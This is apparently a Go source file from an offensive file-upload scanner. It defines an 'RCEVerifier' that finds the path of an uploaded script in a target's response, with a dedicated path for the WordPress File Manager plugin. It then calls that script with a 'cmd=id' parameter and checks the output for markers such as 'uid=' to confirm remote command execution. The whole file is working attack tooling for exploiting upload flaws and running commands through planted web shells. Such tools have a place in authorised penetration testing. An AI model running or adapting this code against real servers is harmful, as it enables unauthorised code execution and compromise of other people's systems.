package verifier

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"path"
	"regexp"
	"strings"
	"time"

	"github.com/HaakimSec/GoUpload/internal/types"
)

type RCEVerifier struct {
	client   *http.Client
	timeout  time.Duration
	command  string
	patterns []PathPattern
}

type PathPattern struct {
	Regex *regexp.Regexp
	Type  string
}

func NewRCEVerifier(client *http.Client, timeout time.Duration) *RCEVerifier {
	if timeout == 0 {
		timeout = 10 * time.Second
	}

	if client == nil {
		client = &http.Client{
			Timeout: timeout,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				if len(via) >= 10 {
					return fmt.Errorf("too many redirects")
				}
				return nil
			},
		}
	}

	return &RCEVerifier{
		client:  client,
		timeout: timeout,
		command: "id",
		patterns: []PathPattern{
			{
				Regex: regexp.MustCompile(`(?i)"(?:url|path|file|filename|location|href|src)"\s*:\s*"([^"]+\.(?:php|phtml|pht|phar|jsp|jspx|asp|aspx|py|pl|cgi|sh|js))"`),
				Type:  "json",
			},
			{
				Regex: regexp.MustCompile(`(?i)(?:href|src|action|url|path|file|location)=["']([^"']+\.(?:php|phtml|pht|phar|jsp|jspx|asp|aspx|py|pl|cgi|sh|js))["']`),
				Type:  "html",
			},
			{
				Regex: regexp.MustCompile(`(?i)(?:uploads|upload|files|images|media|tmp|temp|data|storage|static|assets)/[^"'\s<>]+\.(?:php|phtml|pht|phar|jsp|jspx|asp|aspx|py|pl|cgi|sh|js)`),
				Type:  "text",
			},
			{
				Regex: regexp.MustCompile(`(?i)Location:\s*([^\s]+\.(?:php|phtml|pht|phar|jsp|jspx|asp|aspx|py|pl|cgi|sh|js))`),
				Type:  "header",
			},
			// WordPress File Manager specific pattern
			{
				Regex: regexp.MustCompile(`"name":"([^"]+\.php)"`),
				Type:  "wordpress",
			},
		},
	}
}

func (v *RCEVerifier) VerifyRCE(result *types.Result, baseURL string) error {
	if result == nil || result.Vulnerable != "VULNERABLE" {
		return fmt.Errorf("result is not vulnerable")
	}

	startTime := time.Now()

	// Extract file path from response
	filePath := v.extractFilePath(result.ResponseBody, result.ResponseHeaders, baseURL)
	if filePath == "" {
		return fmt.Errorf("could not extract file path from response")
	}

	// Resolve URL
	fileURL := v.resolveURL(baseURL, filePath)
	if fileURL == "" {
		return fmt.Errorf("could not resolve file URL")
	}

	// Verify execution
	verified, proof := v.verifyExecution(fileURL)

	// Update result
	result.RCEVerified = verified
	result.RCEProof = proof
	result.FileURL = fileURL
	result.RCECommand = v.command
	result.VerificationTime = time.Since(startTime)

	return nil
}

func (v *RCEVerifier) extractFilePath(body string, headers map[string]string, baseURL string) string {
	// Special handling for WordPress File Manager
	if strings.Contains(baseURL, "wp-file-manager") {
		return v.extractWordPressFilePath(body)
	}

	// Check all patterns against body
	for _, pattern := range v.patterns {
		if matches := pattern.Regex.FindStringSubmatch(body); len(matches) > 1 {
			return matches[1]
		}
	}

	// Check headers for location
	if location, ok := headers["Location"]; ok {
		if matches := v.patterns[3].Regex.FindStringSubmatch(location); len(matches) > 1 {
			return matches[1]
		}
	}

	return ""
}

// extractWordPressFilePath handles WordPress File Manager responses
func (v *RCEVerifier) extractWordPressFilePath(body string) string {
	// WordPress File Manager returns JSON with "name" and "url" fields
	// Example: {"added":[{"name":"test-rce.php","url":"\/wordpress\/wp-content\/plugins\/wp-file-manager\/lib\/php\/..\/files\/test-rce.php"}]}

	// Try to extract the URL first
	if matches := regexp.MustCompile(`"url":"([^"]+\.php)"`).FindStringSubmatch(body); len(matches) > 1 {
		// Clean up the URL (remove escaped slashes)
		url := strings.ReplaceAll(matches[1], `\/`, `/`)
		return url
	}

	// If no URL, extract filename and construct path
	if matches := regexp.MustCompile(`"name":"([^"]+\.php)"`).FindStringSubmatch(body); len(matches) > 1 {
		filename := matches[1]
		// WordPress File Manager stores files in lib/files/ directory
		return fmt.Sprintf("/wordpress/wp-content/plugins/wp-file-manager/lib/files/%s", filename)
	}

	return ""
}

func (v *RCEVerifier) resolveURL(baseURL, filePath string) string {
	// Check if it's already absolute
	if strings.HasPrefix(filePath, "http://") || strings.HasPrefix(filePath, "https://") {
		return filePath
	}

	// Parse base URL
	base, err := url.Parse(baseURL)
	if err != nil {
		return ""
	}

	// Handle relative path
	if strings.HasPrefix(filePath, "/") {
		return fmt.Sprintf("%s://%s%s", base.Scheme, base.Host, filePath)
	}

	// Handle relative to current path
	basePath := base.Path
	if idx := strings.LastIndex(basePath, "/"); idx != -1 {
		basePath = basePath[:idx+1]
	}

	return fmt.Sprintf("%s://%s%s%s", base.Scheme, base.Host, basePath, filePath)
}

func (v *RCEVerifier) verifyExecution(fileURL string) (bool, string) {
	ctx, cancel := context.WithTimeout(context.Background(), v.timeout)
	defer cancel()

	// Clean up the URL if needed (resolve ../ in paths)
	fileURL = cleanURL(fileURL)

	// First, check if file executes (not showing source)
	req, err := http.NewRequestWithContext(ctx, "GET", fileURL, nil)
	if err != nil {
		return false, ""
	}

	resp, err := v.client.Do(req)
	if err != nil {
		return false, ""
	}
	defer resp.Body.Close()

	// If 404, try alternative paths
	if resp.StatusCode == 404 {
		return false, ""
	}

	body, err := io.ReadAll(io.LimitReader(resp.Body, 1024*1024)) // 1MB limit
	if err != nil {
		return false, ""
	}

	bodyStr := string(body)

	// Check if source code is visible (not executing)
	if v.isSourceVisible(bodyStr) {
		return false, ""
	}

	// Try command execution
	commandURL := v.addCommandParam(fileURL, v.command)

	req2, err := http.NewRequestWithContext(ctx, "GET", commandURL, nil)
	if err != nil {
		return false, ""
	}

	resp2, err := v.client.Do(req2)
	if err != nil {
		return false, ""
	}
	defer resp2.Body.Close()

	body2, err := io.ReadAll(io.LimitReader(resp2.Body, 1024*1024))
	if err != nil {
		return false, ""
	}

	commandOutput := string(body2)

	// Check for command execution indicators
	if proof := v.extractProof(commandOutput); proof != "" {
		return true, proof
	}

	return false, ""
}

// cleanURL resolves ../ in URLs
func cleanURL(rawURL string) string {
	// Parse the URL
	u, err := url.Parse(rawURL)
	if err != nil {
		return rawURL
	}

	// Clean the path
	u.Path = path.Clean(u.Path)

	return u.String()
}

func (v *RCEVerifier) isSourceVisible(body string) bool {
	// PHP source markers
	if strings.Contains(body, "<?php") || strings.Contains(body, "<?=") {
		return true
	}

	// JSP/ASP source markers
	if strings.Contains(body, "<%@") || strings.Contains(body, "<%=") {
		return true
	}

	// Check for common source code patterns
	sourcePatterns := []string{
		"function ",
		"namespace ",
		"import java",
		"Response.Write",
		"Server.MapPath",
		"eval(",
		"system(",
		"exec(",
	}

	for _, pattern := range sourcePatterns {
		if strings.Contains(body, pattern) {
			return true
		}
	}

	return false
}

func (v *RCEVerifier) addCommandParam(fileURL, command string) string {
	parsedURL, err := url.Parse(fileURL)
	if err != nil {
		return fileURL
	}

	q := parsedURL.Query()
	q.Set("cmd", command)
	parsedURL.RawQuery = q.Encode()

	return parsedURL.String()
}

func (v *RCEVerifier) extractProof(output string) string {
	// Common indicators of successful command execution
	indicators := []string{
		"uid=",
		"gid=",
		"groups=",
		"www-data",
		"daemon",
		"apache",
		"nginx",
		"root:",
		"NT AUTHORITY",
		"user=",
		"home=",
		"PWD=",
		"USER=",
		"RCE_TEST_MARKER:",
		"RCE_SUCCESS:",
	}

	for _, indicator := range indicators {
		if strings.Contains(output, indicator) {
			// Extract relevant line
			lines := strings.Split(output, "\n")
			for _, line := range lines {
				if strings.Contains(line, indicator) {
					return strings.TrimSpace(line)
				}
			}
			// Return first 100 chars if no specific line found
			if len(output) > 100 {
				return output[:100]
			}
			return output
		}
	}

	return ""
}
